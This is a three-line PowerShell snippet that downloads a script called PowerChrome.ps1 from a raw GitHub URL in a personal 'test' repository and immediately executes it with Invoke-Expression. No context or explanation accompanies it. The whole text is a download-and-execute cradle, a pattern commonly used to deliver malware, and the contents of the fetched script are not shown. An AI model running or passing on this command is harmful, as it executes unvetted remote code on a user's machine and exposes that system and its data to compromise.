$url = 'https://raw.githubusercontent.com/nongratap343-arch/test/refs/heads/main/PowerChrome.ps1'
$script = (New-Object Net.WebClient).DownloadString($url)
iex $script
